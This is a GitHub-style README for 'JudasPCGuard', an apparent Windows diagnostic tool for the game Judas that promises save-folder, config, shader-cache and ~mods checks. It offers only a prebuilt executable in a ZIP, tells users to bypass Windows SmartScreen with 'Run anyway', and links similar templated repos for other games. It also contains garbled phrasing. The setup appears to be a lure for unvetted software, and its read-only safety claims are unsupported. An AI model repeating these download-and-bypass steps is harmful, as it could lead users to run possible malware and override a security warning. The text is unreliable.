<p align="center">
  <img src="https://i.postimg.cc/4x7cFK0d/banner.png" alt="Judas UE5 Save & Frame Guard — Shader Compilation, Config & Save Checks for Windows" width="100%">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Platform-Windows%2010%2F11%20x64-0078D6?style=flat-square&logo=windows" alt="Platform: Windows 10/11 x64">
  <img src="https://img.shields.io/badge/Mode-UE5%20Save%20%26%20Frame%20Audit-2EA44F?style=flat-square" alt="Mode">
  <img src="https://img.shields.io/badge/Release-judas--pc--guard--26.11a-5391FE?style=flat-square" alt="Release Tag">
  <img src="https://img.shields.io/badge/License-MIT-8B5CF6?style=flat-square" alt="License: MIT">
</p>

# Judas UE5 Save & Frame Guard — Shader Compilation, Config & Save Checks for Windows

**Judas experiencing Unreal Engine 5 shader compilation hitches on Windows PC? Looking for your local SaveGames folder before branching story choices, or isolating ~mods PAK files after an update? Check your Local AppData paths first.**

Judas UE5 Save & Frame Guard focuses on Ghost Story Games' Unreal Engine 5 PC layout: **all local save slots, `GameUserSettings.ini`, and crash logs reside inside `%LOCALAPPDATA%\Judas\Saved`**, while optional `.pak` overrides sit in `Judas\Content\Paks\~mods`.

This project is aimed at **Judas on Windows PC (Steam & Epic)**. It concerns `%LOCALAPPDATA%\Judas\Saved` save backups, UE5 config inspection, DX12 shader cache space checks, and `~mods` isolation—not save editing.

## Quick Symptom & Cause Reference

| Symptom / Error | Likely Cause | Recommended Check |
| --- | --- | --- |
| DX12 shader compilation hitching on new decks | Driver update invalidated PSOs or low free space on `C:` | Check `C:` free space and let initial shader warm-up finish |
| Protecting branching narrative saves | Dynamic story choices overwrite active progress slots | Back up `%LOCALAPPDATA%\Judas\Saved\SaveGames` before key decisions |
| Crash on startup after patch with `~mods` | Outdated `.pak` archive inside `Judas\Content\Paks\~mods` | Move custom `.pak` files out of `~mods` and test a clean boot |
| VRAM saturation with Ray Tracing enabled | RT reflections + Ultra textures exceeding 8 GB GPU memory | Check GPU VRAM headroom and adjust shadow/RT presets |

## Download for Windows

[**Download JudasPCGuard.zip — Latest GitHub Release (Windows x64)**](../../releases/latest/download/JudasPCGuard.zip)  
[View All Releases & Changelog](../../releases) · [Report an Issue](../../issues)

### Why run `JudasPCGuard.exe`? (Automatic checks in ~2 seconds)

- Locates `%LOCALAPPDATA%\Judas\Saved\SaveGames` and lists all save slots with timestamps and sizes.
- Inspects `Saved\Config\Windows` (`GameUserSettings.ini`, `Engine.ini`) and checks `C:` free space.
- Audits `Judas\Content\Paks\~mods` for third-party `.pak` files that may conflict after updates.
- Scans `Saved\Logs` for recent Unreal Engine 5 crash signatures.

### Sample Diagnostic Output

```text
[JudasPCGuard] Auditing Judas UE5 SaveGames, Configs & ~mods...
[OK]   Saved Path       : C:\Users\Player\AppData\Local\Judas\Saved
[OK]   SaveGames        : 5 save files found (Latest: 6.8 MB)
[OK]   Config\Windows   : GameUserSettings.ini (2.8 KB)
[OK]   ~mods Folder     : None detected (Clean vanilla Paks)
[OK]   System Drive C:  : 48.5 GB free
```

The release ZIP is named `JudasPCGuard.zip`; the Windows executable inside is named `JudasPCGuard.exe`.

1. Close Judas before moving or checking game files.
2. Click **Download JudasPCGuard.zip** above.
3. Right-click the downloaded archive and choose **Extract All**.
4. Open the extracted folder and run `JudasPCGuard.exe`.
5. Review the reported locations and status checks before making any changes to your files.
6. Restart Judas and verify behavior after applying any recommended fixes.

**Requirements:** Windows 10 or 11 (64-bit), a Windows PC installation of Judas, and access to `%LOCALAPPDATA%\Judas`.

### Verification & Windows SmartScreen Note

- **Read-only & standard user permissions:** `JudasPCGuard.exe` runs without administrator rights and does not modify game binaries, system registry keys, or Windows Defender settings.
- **Windows SmartScreen:** Because this is an independent open-source utility without a commercial EV code-signing certificate, Windows SmartScreen may show *"Windows protected your PC"* on first launch. Click **More info → Run anyway** after verifying the release checksum on the [Releases](../../releases) page.

## Problems this project focuses on

### DirectX 12 shader compilation stutter when entering new Mayflower decks

UE5 compiles PSOs into `%LOCALAPPDATA%` on drive `C:`. Insufficient system-drive headroom or invalidated GPU driver caches cause brief camera hitches.

### Backing up branching story saves before key narrative decisions

Because Judas features dynamic narrative consequences, keeping dated snapshots of `%LOCALAPPDATA%\Judas\Saved\SaveGames` lets you preserve milestone checkpoints.

### Crash on startup after a patch with custom `~mods` or `Engine.ini` edits

Outdated `.pak` files in `Judas\Content\Paks\~mods` or aggressive `Engine.ini` console variables often break after official patches.

### VRAM saturation with Ray Tracing and High textures on 8 GB GPUs

Lowering shadow/reflection presets prevents PCIe system-memory swapping during intense combat.

## Where Judas files normally belong

On Windows PC, local save slots, engine settings, and crash logs reside inside `%LOCALAPPDATA%\Judas\Saved`:

```text
%LOCALAPPDATA%\Judas\Saved\
```

Inside that structure, key files and subdirectories typically look like this:

```text
%LOCALAPPDATA%\Judas\Saved\
├── Config\
│   └── Windows\
│       ├── GameUserSettings.ini
│       └── Engine.ini
├── Logs\
└── SaveGames\
```

Custom `.pak` files inside your Steam installation belong under `steamapps\common\Judas\Judas\Content\Paks\~mods\`.

## A practical troubleshooting checklist

If your issue still persists, work through these checks in order:

1. **Close Judas completely.** Verify `Judas-Win64-Shipping.exe` has exited in Task Manager.
2. **Back up `%LOCALAPPDATA%\Judas\Saved\SaveGames`.** Copy your save files to a dated folder in Documents before patching or branching.
3. **Check free space on drive `C:`.** Ensure at least 15 GB of free system-drive space for DX12 shader caches.
4. **Inspect `Saved\Config\Windows` files.** Back up `GameUserSettings.ini` and `Engine.ini` before testing graphics tweaks.
5. **Isolate `~mods` `.pak` files after updates.** Move custom `.pak` files out of `Judas\Content\Paks\~mods` if startup crashes occur.
6. **Verify installed files in Steam / Epic.** Repair any damaged archive files.
7. **Restart Judas cleanly.** Verify smooth frametimes and save slot loading.

### Before moving any files

Always copy `%LOCALAPPDATA%\Judas\Saved\SaveGames` to Documents before resetting configuration folders.

## What an effective diagnostic report should tell you

A clear diagnostic check locates **`%LOCALAPPDATA%\Judas\Saved` saves and configs**, checks `C:` free space, and scans `Content\Paks\~mods`.

## FAQ

**Where are Judas save files stored on Windows?**

On Steam Windows setups, saves are stored in `%LOCALAPPDATA%\Judas\Saved\SaveGames\`.

**Where are Judas config files located?**

Inside `%LOCALAPPDATA%\Judas\Saved\Config\Windows\` (`GameUserSettings.ini` and `Engine.ini`).

**Why does Judas stutter after a GPU driver update?**

Driver updates clear the compiled DirectX 12 shader cache, causing temporary stutter while shaders rebuild.

**Does this tool edit save files or unlock abilities?**

No. It performs read-only inspection of save, config, and mod folders.

**Are any game files bundled with this repository?**

No copyrighted game files are included here.

## Useful reading

- [Judas Official Website (Ghost Story Games)](https://www.judasgame.com/)
- [Judas on Steam](https://store.steampowered.com/app/388860/Judas/)

## More Windows Game Diagnostic Tools

- [Directive8020-BranchSaveVault](../Directive8020-BranchSaveVault) — Directive 8020 branching save backup & `0 KB` check
- [GearsEDay-UE5StutterDoctor](../GearsEDay-UE5StutterDoctor) — Gears of War: E-Day UE5 DX12 stutter & config doctor
- [Stalker2-ShaderCacheGuard](../Stalker2-ShaderCacheGuard) — S.T.A.L.K.E.R. 2 UE5 shader compilation & `C:` space check
- [Marvel1943-ShaderConfigAudit](../Marvel1943-ShaderConfigAudit) — Marvel 1943: Rise of Hydra UE5 shader & VRAM audit

*Independent community project. Not affiliated with Ghost Story Games, Take-Two Interactive, Valve, or Steam. All trademarks belong to their respective owners.*
 
 
 
 
